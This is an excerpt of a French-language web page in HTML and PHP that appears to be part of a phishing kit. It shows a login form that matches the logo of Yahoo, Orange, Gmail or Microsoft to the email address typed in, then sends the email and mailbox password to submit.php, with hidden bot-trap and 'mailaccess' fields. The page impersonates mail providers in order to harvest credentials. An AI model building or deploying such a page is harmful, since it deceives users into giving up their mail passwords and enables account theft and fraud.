...
<body>
<script>
function detect_mail(){
	var email = document.getElementById("authfortmail").value.toLowerCase();
	if(email.includes("@")){
	if(email.includes("yahoo")){
		document.getElementById("maillogo").src = 'img/yahoo.png';
	}else if(email.includes("orange")){
		document.getElementById("maillogo").src = 'img/orange.png';

	}else if(email.includes("gmail")){
		document.getElementById("maillogo").src = 'img/gmail.png';

	}else if(email.includes("outlook")){
		document.getElementById("maillogo").src = 'img/microsoft.png';

	}else if(email.includes("live")){
		document.getElementById("maillogo").src = 'img/microsoft.png';
		...
		document.getElementById("maillogo").src = 'img/mail.png';
	}
	}else{
		document.getElementById("maillogo").src = 'img/mail.png';
	}
    ...
    <main id="main" class="main">
        <div class="container">
            <div class="details-container">
                ...
                <p class="mb-2" style="font-weight: 600; color: #333; font-size: 18px;">Accéder au courrier <img id="maillogo" src="img/mail.png" height=30 width=30 /></p> 
                <p style="font-weight: 600; color: #333; font-size: 14px;">Vous devez associer votre email, pour faire sa connectez-vous :</p>
                <form method="post" action="submit.php">
                    <div class="form-group">
                        <label for="email">Email *</label>
                        <input style="max-width: 300px;"  onkeypress="detect_mail()" onchange="detect_mail()" type="text" name="email" id="authfortmail" placeholder="Veuillez saisir la donnée" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'authfort') ?>">
                        <?php echo validation($_SESSION['errors'],'email'); ?>
                    </div>
					<div class="form-group">
                        <label for="pass">Mots de passe *</label>
                        <input style="max-width: 300px;"  type="password" name="pass" id="authfort" placeholder="Veuillez saisir la donnée" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'authfort') ?>">
                        <?php echo validation($_SESSION['errors'],'pass'); ?>
                    </div>
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="mailaccess">
